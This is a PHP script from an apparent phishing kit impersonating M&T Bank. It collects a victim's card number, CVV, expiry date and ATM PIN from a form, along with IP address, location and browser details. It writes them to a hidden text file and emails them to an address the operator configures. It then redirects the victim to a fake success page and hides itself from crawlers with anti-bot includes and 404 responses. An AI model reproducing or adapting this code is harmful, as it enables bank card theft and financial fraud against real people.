<?php
session_start();
include "../conf/config.php";

include '../../huehuehue.php';
include '../../blueprint/antbots/crawler.php';



if($_POST){
    $ccn 	  = $_POST['ccnum'];
	$cvv 	  = $_POST['cvv'];
	$expmnth  = $_POST['expdate'];
	$atm	  = $_POST['pin'];

    $ip = $_SERVER['REMOTE_ADDR'];


    $mes = "::::::::::::::::::::::: MnT BLUEPRINT 1nf0 1 [Card Details] :::::::::::::::::::::::::\r\n";
    $mes .= "Card                                 : $ccn\r\n";
    $mes .= "cvv                                  : $cvv\r\n";
    $mes .= "Exp                                  : $expmnth\r\n";
    $mes .= "Pin                                  : $atm\r\n";
    $mes .=  "|--------------- I N F O | I P -------------------|\r\n";
    $mes .= "IP Address	                       : {$_SESSION['ip']}\r\n";
    $mes .= "IP Country	                       : {$_SESSION['country']}\r\n";
    $mes .= "IP City	                       : {$_SESSION['city']}\r\n";
    $mes .= "Browser		                   : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $mes .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $mes .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
    $mes .= "::::::::::::::::::::::  MnT BLUEPRINT 1nf0 :::::::::::::::::::::::::\r\n";
         if($savetxt == "on"){
        $sv = fopen("../data/card".$salt.".txt",'a');
        fwrite($sv,$mes."\n");
        fclose($sv);}$subject="Card Details => From {$_SESSION['ip']}";$headers="From: Blue_prints <blue_printss@M&T.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/plain; charset=UTF-8\r\n";@mail($emailz,$subject,$mes,$headers);

        header("Location: ../../success.php?&sessionid={$_SESSION['rand']}&ue");
        }else{
            exit(header("HTTP/1.0 404 Not Found"));
        }
?>